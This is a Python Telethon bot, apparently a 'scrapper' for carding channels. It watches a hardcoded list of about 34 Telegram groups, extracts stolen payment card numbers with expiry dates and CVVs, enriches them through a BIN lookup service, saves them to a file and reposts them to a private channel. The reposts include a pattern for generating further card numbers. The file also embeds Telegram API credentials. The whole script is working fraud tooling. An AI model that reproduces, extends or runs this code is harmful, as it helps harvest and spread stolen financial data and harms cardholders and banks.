from defs import getUrl, getcards, phone
from flask import Flask
import telethon
import asyncio
import os, sys
import re
import requests
from telethon import TelegramClient, events
import random_address
from random_address import real_random_address
import names
from datetime import datetime
import time
import random
from telethon.tl.types import PeerUser, PeerChat, PeerChannel

API_ID = 28883268
API_HASH = '2850e9f51b84512f603f962ee64ad517'
SEND_ID = -1001717845191
client = TelegramClient('session', API_ID, API_HASH)
ccs = []
chats = [
    '@LalaScrapperPublic',
    '@AstralScrapper',
    '@VegetaScrap',
    '@JLScrapper',
    '@BINEROS_CCS2',
    '@ozarkscrapper',
    '@ChatA2Assiad',
    '@kurumichat',
    '@techzillacheckerchat',
    '@oficialscorpionsgrupo',
    '@PublicExp',
    '@JohnnySinsChat',
    '@NfPrBroScraper',
    '@VenexChk',
    '@hcccdrops',
    '@ScrapperLost',
    '@CcsRoyals',
    '@RemChatChk',
    '@TeamBlckCard',
    '@astachkccs',
    '@ScrapeLive',
    '@leonbinerss',
    '@SexyDrops',
    '@cardesclub',
    '@kurumichks',
    '@binners_LA',
    '@CHECKEREstefany_bot',
    '@scrapper_ddrbins',
    '@valeryscrapp',
    '@ChatPFL',
    '@dSnowChat',
    '@KiraAccountsGrupo',
    '@onyxlivespublic',
    '@botsakuraa'

]
with open('cards.txt', 'r') as r:
    temp_cards = r.read().splitlines()

for x in temp_cards:
    car = getcards(x)
    if car:
        ccs.append(car[0])
    else:
        continue


@client.on(events.NewMessage(chats=chats, func=lambda x: getattr(x, 'text')))
async def my_event_handler(m):
    if m.reply_markup:
        text = m.reply_markup.stringify()
        urls = getUrl(text)
        if not urls:
            return
        text = requests.get(urls[0]).text
    else:
        text = m.text
    cards = getcards(text)
    if not cards:
        return
    cc, mes, ano, cvv = cards
    if cc in ccs:
        return
    ccs.append(cc)
    extra = cc[0:0 + 12]
    bin = requests.get(f'https://bin-api-dragon.ga/bin/api/{cc[:6]}')
    if not bin:
        return
    bin_json = bin.json()
    fullinfo = f"{cc}|{mes}|{ano}|{cvv}"
    #print(f'{cc}|{mes}|{ano}|{cvv}')
    print(f'{cc}|{mes}|{ano}|{cvv} - Aprovada [a+]')
    with open('cards.txt', 'a') as w:
        w.write(fullinfo + '\n')
    await client.send_message(
        PeerChannel(SEND_ID),
        f"""
● > __ 𝙌𝙪𝙖𝙘𝙠'𝙨 [ 𝙎𝙘𝙧𝙖𝙥𝙥𝙚𝙧 ] V2.5 [ S : ```{cc[:6]}``` ] _____

·͙⁺˚*•̩̩͙✩•̩̩͙*˚⁺‧͙⁺˚*•̩̩͙✩•̩̩͙*˚⁺‧͙⁺˚*•̩̩͙✩•̩̩͙*˚⁺‧͙
𝘾𝘼𝙍𝘿 : `{cc}|{mes}|{ano}|{cvv}`
·͙⁺˚*•̩̩͙✩•̩̩͙*˚⁺‧͙⁺˚*•̩̩͙✩•̩̩͙*˚⁺‧͙⁺˚*•̩̩͙✩•̩̩͙*˚⁺‧͙

♙ ᴠᴇɴᴅᴏʀ : {bin_json['data']['vendor']}
♘ ᴛʏᴘᴇ : {bin_json['data']['type']} 
♙ ʟᴇᴠᴇʟ : {bin_json['data']['level']}
♘ ʙᴀɴᴋ : {bin_json['data']['bank']}
♙ ᴄᴏᴜɴᴛʀʏ :  {bin_json['data']['countryInfo']['name']} » ┇ « {bin_json['data']['countryInfo']['emoji']}

♘ ᴇxᴛʀᴀ: `{extra}xxxx|{mes}|{ano}|{cvv}`

ˏˋ°•*⁀➷ 𝘿𝙚𝙫 
             [ @ReyAustin ] 𝙖𝙣𝙙 [ @XerozSploitTae ]
""",file = 'deff.jpg')


@client.on(events.NewMessage(outgoing=True, pattern=re.compile(r'.lives')))
async def my_event_handler(m):
    # emt = await client.get_entity(1582775844)
    # print(telethon.utils.get_input_channel(emt))
    # print(telethon.utils.resolve_id(emt))
    await m.reply(file='cards.txt')
    time.sleep(4)


client.start()
client.run_until_disconnected()
